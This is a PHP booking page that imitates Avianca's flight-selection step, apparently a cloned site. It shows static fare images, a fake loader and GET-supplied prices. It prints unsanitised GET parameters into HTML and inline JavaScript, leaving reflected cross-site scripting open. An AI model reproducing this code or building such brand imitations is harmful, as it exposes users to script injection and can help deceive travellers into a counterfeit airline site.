<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>

    <?php

    function separarFechas($cadena)
    {
        // Dividir la cadena por el guion (-)
        $partes = explode(' - ', $cadena);

        // Las partes estarán en el array $partes
        $fecha1 = $partes[0];
        $fecha2 = $partes[1];

        return array($fecha1, $fecha2);
    }

    function formatearNumero($numero)
    {
        // Usar number_format para formatear el número
        $numero_formateado = number_format($numero, 0, ',', '.');

        return $numero_formateado;
    }

    // Obtener variables desde GET
    $codigoDesde = $_GET['codigoDesde'] ?? '';
    $ciudadDesde = $_GET['ciudadDesde'] ?? '';
    $codigoHacia = $_GET['codigoHacia'] ?? '';
    $ciudadHacia = $_GET['ciudadHacia'] ?? '';
    $fecha = $_GET['fecha'] ?? '';
    $tipo_fecha = $_GET['tipo_fecha'] ?? '';

    $horaA = $_GET["horaA"];
    $horaB = $_GET["horaB"];
    $precio = $_GET["precio"];

    $entrada = $fecha;

    // Utilizar una expresión regular para extraer el valor entre paréntesis
    preg_match('/\((.*?)\)/', $entrada, $matches);

    // El valor estará en $matches[1]
    $valorEntreParentesis = $matches[1];

    // Reemplazar espacios con guiones
    $fechaForm = str_replace('a', '-', $valorEntreParentesis);

    if ($tipo_fecha === "rango") {
        $cadena = $fechaForm;
        list($fecha_salida, $fecha_vuelta) = separarFechas($cadena);
    } else if ($tipo_fecha === "normal") {
        $fecha_salida = $fechaForm;
    }

    ?>


    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso1.png" alt="" class="pasos">
    </div>
    <div class="body_check">
        <?php
        if ($tipo_fecha === "rango") {
        ?>
            <div class="row_hd">
                <div class="text_hd">
                    <p>Vuelo de ida - <?php echo $fecha_salida; ?></p>
                    <h4><?php echo $ciudadDesde; ?> a <?php echo $ciudadHacia; ?> </h4>
                </div>
                <div class="btn_edit">
                    <button type="button" onclick="regrear();">
                        <img src="media/editar.png" alt=""></button>
                </div>
            </div>

            <div class="info_vuelo">
                <p class="directo">Directo | 1h 34m</p>
                <div class="row_horario">
                    <p><?php echo $horaA; ?></p>
                    <div class="lineSeparatorHours"></div>
                    <p><?php echo $horaB; ?></p>
                </div>

                <div class="row_detalle">
                    <div class="info">
                        <img src="media/icon_i.png" alt="">
                        <p>Detalles de vuelo:</p>
                    </div>
                    <div class="precio">
                        $<?php echo formatearNumero($precio); ?> COP
                    </div>
                </div>
                <div class="i_vuelo">
                    <img src="media/info_vuelo.png" alt="">
                </div>
            </div>

            <img src="media/sin_sorpresas.png" alt="" class="sin_sorpresas" id="sin_sorpresas">

            <div class="row_hd">
                <div class="text_hd">
                    <p>Selecciona tu vuelo de llegada - <?php echo $fecha_vuelta; ?></p>
                    <h4> <?php echo $ciudadHacia; ?> a <?php echo $ciudadDesde; ?> </h4>
                </div>
                <div class="btn_edit">
                    <button type="button" onclick="editarVuelo(<?php echo $precio; ?>);">
                        <img src="media/editar.png" alt=""></button>
                </div>
            </div>

            <div class="info_vuelo" id="vueloLlegada">
                <p class="directo">Directo | 1h 34m</p>
                <div class="row_horario">
                    <p id="horaA"></p>
                    <div class="lineSeparatorHours"></div>
                    <p id="horaB"></p>
                </div>

                <div class="row_detalle">
                    <div class="info">
                        <img src="media/icon_i.png" alt="">
                        <p>Detalles de vuelo:</p>
                    </div>
                    <div class="precio" id="precio">

                    </div>
                </div>
                <div class="i_vuelo">
                    <img src="media/info_vuelo.png" alt="">
                </div>
            </div>

            <div class="precios" id="precios">
                <img src="media/precio1.png" alt="" onclick="getTarifa('AXM 08:05 - 09:39 <?php echo $codigoDesde; ?>', '<?php echo $fecha_salida; ?>', 1, '<?php echo $tipo_fecha; ?>');">

                <img src="media/precio2.png" alt="" onclick="getTarifa('AXM 09:50 - 11:24 <?php echo $codigoDesde; ?>', '<?php echo $fecha_salida; ?>', 2, '<?php echo $tipo_fecha; ?>');">

                <img src="media/precio3.png" alt="" onclick="getTarifa('AXM 15:45 - 17:19 <?php echo $codigoDesde; ?>', '<?php echo $fecha_salida; ?>', 3, '<?php echo $tipo_fecha; ?>');">

                <img src="media/precio4.png" alt="" onclick="getTarifa('AXM 18:30 - 20:04 <?php echo $codigoDesde; ?>', '<?php echo $fecha_salida; ?>', 4, '<?php echo $tipo_fecha; ?>');">
            </div>

            <div class="total_r">
                <div class="txt_">
                    <p>Total de tu reserva:</p>
                    <p class="precio" id="precioTotal">$<?php echo formatearNumero($precio); ?> COP</p>
                </div>

                <button type="button" disabled id="continuar" onclick="continuarViaje();">Continúa personalizando tu viaje</button>
            </div>

            <div class="textFooterBook">
                © Avianca S.A 2023
            </div>
        <?php
        } else if ($tipo_fecha === "normal") {
        ?>
            <div class="row_hd">
                <div class="text_hd">
                    <p>Vuelo de ida - <?php echo $fecha_salida; ?></p>
                    <h4><?php echo $ciudadDesde; ?> a <?php echo $ciudadHacia; ?> </h4>
                </div>
                <div class="btn_edit">
                    <button type="button" onclick="regrear();">
                        <img src="media/editar.png" alt=""></button>
                </div>
            </div>

            <div class="info_vuelo">
                <p class="directo">Directo | 1h 34m</p>
                <div class="row_horario">
                    <p><?php echo $horaA; ?></p>
                    <div class="lineSeparatorHours"></div>
                    <p><?php echo $horaB; ?></p>
                </div>

                <div class="row_detalle">
                    <div class="info">
                        <img src="media/icon_i.png" alt="">
                        <p>Detalles de vuelo:</p>
                    </div>
                    <div class="precio">
                        $<?php echo formatearNumero($precio); ?> COP
                    </div>
                </div>
                <div class="i_vuelo">
                    <img src="media/info_vuelo.png" alt="">
                </div>
            </div>

            <img src="media/sin_sorpresas.png" alt="" class="sin_sorpresas" id="sin_sorpresas">



            <div class="total_r">
                <div class="txt_">
                    <p>Total de tu reserva:</p>
                    <p class="precio" id="precioTotal">$<?php echo formatearNumero($precio); ?> COP</p>
                </div>

                <button type="button" id="continuar" onclick="continuarViaje();">Continúa personalizando tu viaje</button>
            </div>

            <div class="textFooterBook">
                © Avianca S.A 2023
            </div>
        <?php
        }
        ?>
    </div>

</body>

<div class="modal modal-container" id="modal_tarifa">
    <div class="content-modal content-modal-np">
        <div class="content_booking">
            <div class="headerPickF headerPickF2">
                <div class="row_txt_">
                    <button type="button" onclick="closeModalTarifa();"><img src="media/regresar.png" alt=""></button>
                    <p>Selecciona tu tarifa</p>
                </div>

                <div class="row_info_">
                    <p id="tarifaText1"><strong> AXM 08:05 - 09:39 BAQ </strong></p>
                    <p id="tarifaText2"> Lun, Nov 28 </p>
                </div>
            </div>

            <div class="container-tabs-cabin">
                <p>Económica</p>
            </div>

            <div class="precios_tarifa" id="precios_tarifa">

            </div>

        </div>
    </div>
</div>

<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/check1.js"></script>
<div class="loader_inicial" id="loaderI">
    <img src="media/loading.png" alt="">
    <div class="lds-ring">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
    </div>
</div>

<script>
    setTimeout(function() {
        $('#loaderI').hide();
    }, 3000);
</script>

</html>